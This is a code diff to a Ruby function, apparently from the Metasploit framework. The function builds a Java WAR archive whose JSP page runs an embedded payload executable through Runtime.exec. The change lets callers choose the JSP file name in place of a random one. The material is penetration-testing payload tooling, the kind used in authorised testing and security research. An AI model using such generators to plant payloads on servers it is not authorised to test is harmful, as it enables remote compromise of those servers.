@@ -584,8 +584,8 @@ require 'metasm'
 	def self.to_jsp_war(framework, arch, plat, code='', opts={})
 
 		exe = to_executable(framework, arch, plat, code, opts)
-		var_payload = Rex::Text.rand_text_alpha_lower(rand(8)+8)
-		var_name = Rex::Text.rand_text_alpha_lower(rand(8)+8)
+		jsp_name = opts[:jsp_name]
+		jsp_name ||= Rex::Text.rand_text_alpha_lower(rand(8)+8)
 
 		zip = Rex::Zip::Archive.new
 
@@ -617,8 +617,9 @@ version="2.4">
 </web-app>
 }
 
+		var_name = Rex::Text.rand_text_alpha_lower(rand(8)+8)
 		webxmlraw.gsub!(/NAME/, var_name)
-		webxmlraw.gsub!(/PAYLOAD/, var_payload)
+		webxmlraw.gsub!(/PAYLOAD/, jsp_name)
 
 		zip.add_file('WEB-INF/web.xml', webxmlraw)
 		# end web-inf/web.xml
@@ -675,7 +676,7 @@ version="2.4">
 		jspraw << "Process #{var_proc} = Runtime.getRuntime().exec(#{var_exepath});\n"
 		jspraw << "%>\n"
 
-		zip.add_file("#{var_payload}.jsp", jspraw)
+		zip.add_file("#{jsp_name}.jsp", jspraw)
 		# end <payload>.jsp
 
 		# begin <payload>.txt
